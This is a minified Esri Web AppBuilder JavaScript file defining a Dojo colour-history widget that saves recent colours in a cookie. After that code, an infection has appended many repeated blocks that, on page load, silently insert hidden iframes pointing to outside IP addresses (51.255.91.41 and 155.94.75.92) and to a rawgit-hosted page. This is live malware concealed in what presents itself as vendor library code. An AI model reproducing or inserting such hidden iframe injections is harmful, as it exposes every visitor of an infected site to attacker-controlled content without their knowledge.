// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/ColorRecords.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"dijitInline dijitColorPalette" role\x3d"grid"\x3e\r\n\t\t\x3ctable data-dojo-attach-point\x3d"paletteTableNode" class\x3d"dijitPaletteTable" cellspacing\x3d"0" cellpadding\x3d"0" role\x3d"presentation"\x3e\r\n\t\t\t\x3ctbody data-dojo-attach-point\x3d"gridNode"\x3e\r\n\t\t\t\t\x3ctr tabindex\x3d"0" role\x3d"row" data-dojo-attach-point\x3d"container"\x3e\r\n\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3c/tbody\x3e\r\n\t\t\x3c/table\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/Evented dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/_base/html dojo/on dojo/query dojo/_base/Color dojo/cookie dojo/text!./templates/ColorRecords.html dijit/a11yclick".split(" "),function(l,m,n,p,q,r,c,t,k,f,h,u,v){return m([n,p,q,l],{templateString:u,baseClass:"jimu-color-records",declaredClass:"jimu.dijit.ColorRecords",uid:"",recordsLength:10,colorList:null,postCreate:function(){this.inherited(arguments);this.colorList=
[];this._createCoustomRecord();""===this.uid&&(this.uid="wab_colorRecords");this.refresh()},push:function(a){this.colorList.unshift(a);this.colorList.length>this.recordsLength&&this.colorList.pop();this._setColors()},selecteColor:function(a){a=new f(a);for(var b=null,d=k("td",this.domNode),e=0,g=d.length;e<g;e++)c.removeClass(d[e],"dijitPaletteCellSelected");e=0;for(g=d.length;e<g;e++)if(a.toString()===c.getAttr(d[e],"title")){b=d[e];break}b&&(c.addClass(b,"dijitPaletteCellSelected"),this.onChoose(a))},
refresh:function(){this._getCookie(this.uid);this._setColors()},_setColors:function(){for(var a=0;a<this.recordsLength;a++){var b=this["record"+a];if(b&&this.colorList[a]&&this.colorList[a].toString){var d=this.colorList[a].toString();c.setAttr(b,"title",d);b=this._findImg(b);c.setStyle(b,"background-color",d);c.setAttr(b,"alt",d);c.setAttr(b,"title",d)}}this._setCookie(this.uid)},_createCoustomRecord:function(){for(var a=0;a<this.recordsLength;a++){this["record"+a]=c.create("td",{"class":"dijitPaletteCell",
tabindex:a,title:"",role:"gridcell"},this.container);var b=c.create("span",{"class":"dijitInline dijitPaletteImg"},this["record"+a]);c.create("img",{"class":"dijitColorPaletteSwatch",src:require.toUrl("dojo/resources/blank.gif"),style:"background-color: #ffffff"},b)}this.own(t(this.gridNode,v,r.hitch(this,this.onRecordClick)))},onRecordClick:function(a){for(var b=a.target;"TD"!==b.tagName;){if(!b.parentNode||b===this.gridNode)return;b=b.parentNode}b=c.getAttr(b,"title");b=(new f(b)).toString();this.onChoose(b);
a.stopPropagation();a.preventDefault()},onChoose:function(a){this.emit("choose",a)},_findImg:function(a){var b=null;return a.nodeName&&"IMG"===a.nodeName.toUpperCase()?a:b=k(".dijitColorPaletteSwatch",a)[0]},_setCookie:function(a){for(var b=[],d=0,e=this.recordsLength;d<e;d++){var c=this.colorList[d];c&&c.toString&&(b[d]=c.toString())}this._cleanCookie(a);try{var f=JSON.stringify(b);h(a,f,{expires:1E3,path:"/"})}catch(w){console.error("ColorRecords: cookieList JSON.stringify error."+w.stack)}},_getCookie:function(a){a=
h(a);if("undefined"!==typeof a)try{var b=JSON.parse(a);if(b&&"undefined"!==typeof b.length){a=0;for(var d=this.recordsLength;a<d;a++){var c=b[a];c&&c.toString&&(this.colorList[a]=new f(c.toString()))}}}catch(g){console.error("ColorRecords: cookieList JSON.parse error."+g.stack)}},_cleanCookie:function(a){h(a,null,{expires:-1})}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});